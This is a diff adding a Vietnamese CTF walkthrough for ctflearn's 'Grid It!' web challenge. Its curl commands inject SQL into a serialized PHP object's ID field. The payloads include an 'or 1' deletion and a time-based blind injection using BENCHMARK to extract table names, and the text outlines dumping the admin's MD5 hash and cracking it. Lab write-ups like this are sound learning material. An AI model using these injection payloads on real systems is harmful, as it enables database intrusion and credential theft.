@@ -335,3 +335,38 @@
 - Flag sẽ được ghi vào bên trong file flag.
 
 ## Grid It!
+#### Quan sát vấn đề
+
+- Trước mắt là thấy trang web sẽ gửi dữ liệu theo method post với các giao thức là `register`, `login`, `add_point`, `delete_point`.
+- Với `add_point` sẽ gửi dữ liệu qua `https://web.ctflearn.com/grid/controller.php?action=add_point` với data là `x=a&y=b`.
+- Với `delete_point` sẽ gửi qua `https://web.ctflearn.com/grid/controller.php?action=delete_point&` với tham số `point=O:5:"point":3:{s:1:"x";s:1:"6";s:1:"y";s:1:"4";s:2:"ID";s:7:"3623544";}`.
+
+#### Ok vào vấn đề chính.
+- Đầu tiên là đăng kí và đăng nhập cái đã.
+- Với `add_point` sau khi mình thử nhiều lần thì không có công dụng gì lắm chủ yếu chỉ là ở phần `delete_point` thôi.
+- Giờ ta sẽ thử gửi 1 request về máy chủ với lệnh 
+```
+    curl --cookie "PHPSESSID=____" "https://web.ctflearn.com/grid/controller.php?action=add_point" --data "x=1&y=1"
+```
+- Với giá trị ____ là PHPSESSID của bạn. 
+- Từ đó thì ta có thể thấy được trên trang web đã add thêm 1 nút cho chúng ta.
+- Rồi giờ thử gửi 1 lệnh xóa xem như nào:
+```
+    curl --cookie "PHPSESSID=____" "https://web.ctflearn.com/grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"6";s:1:"y";s:1:"4";s:2:"ID";s:7:"3623544";}"
+```
+- Và ok đã xóa thành công. Giờ hãy thử add thêm thật nhiều nút để thử SQL Injection xem sao. (Tự add nhé :Đ ).
+- Giờ sẽ dùng lệnh 
+```
+    curl --cookie "PHPSESSID=____" "https://web.ctflearn.com/grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"6";s:1:"y";s:1:"4";s:2:"ID";s:7:"3623544 or 1";}"
+```
+- Và well ta đã thành công xóa tất cả các nút với câu lệnh trên và đây chính là nơi để tận dụng cái inject này.
+- Do không có các nào để lấy được hay hiển thị dữ liệu để mình có thể nhìn thấy được nên trong trường hợp này ta sẽ sử dụng 1 kỹ thuật là Blind SQL Injection.
+- Dựa trên những gì ta đã có thì câu lệnh delete của trang web sẽ có dạng DELELTE FROM ... WHERE ID = ____ và ta sẽ thêm vào phần id giá trị như sau:
+```
+    curl --cookie "PHPSESSID=____"\
+    "https://web.ctflearn.com/grid/controller.php?action=delete_point"\
+    --data-urlencode 'point=O:5:"point":3:{s:1:"x";s:3:"123";s:1:"y";s:3:"123";s:2:"ID";s:182:"3623781 AND IF(Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1),1,1))>97, BENCHMARK(50000000, ENCODE("test","key")), NULL)";}' --get
+```
+- Đoạn mã trên đại loại sẽ lấy giá trị đầu tiên trong các tên bảng và kiểm tra kí tự đầu tiên của tên đó nếu đúng thì sẽ delay khá lâu và nếu sai thì sẽ không có sự delay nào ở đây cả. Và từ đó là ta đã đi vào Blind SQL Injection rồi :D.
+- Giờ thì chỉ cần dùng tìm kiếm nhị phân tìm ra tên bảng rồi sau đó thay đổi câu lệnh sql tìm ra cột trong bảng và các giá trị có trong bảng thôi.
+- Vì tới thời điểm hiện tại bài đã được tải lên khá lâu rồi nên DB sẽ có nhiều dữ liệu rác nên có thể công cuộc tìm kiếm sẽ khá là khó vậy nên có thể gợi ý cho bạn là sẽ có 2 bảng chính là user và point, bảng user sẽ có username và password. Lần ra password qua username là admin và sẽ có 1 mã hash bằng md5. Dùng 1 tool để decrypt mã hash ra là sẽ có pass của admin, đăng nhập vào là sẽ được flag. (nội dung flag chả liên quan gì tới bài ._. ).
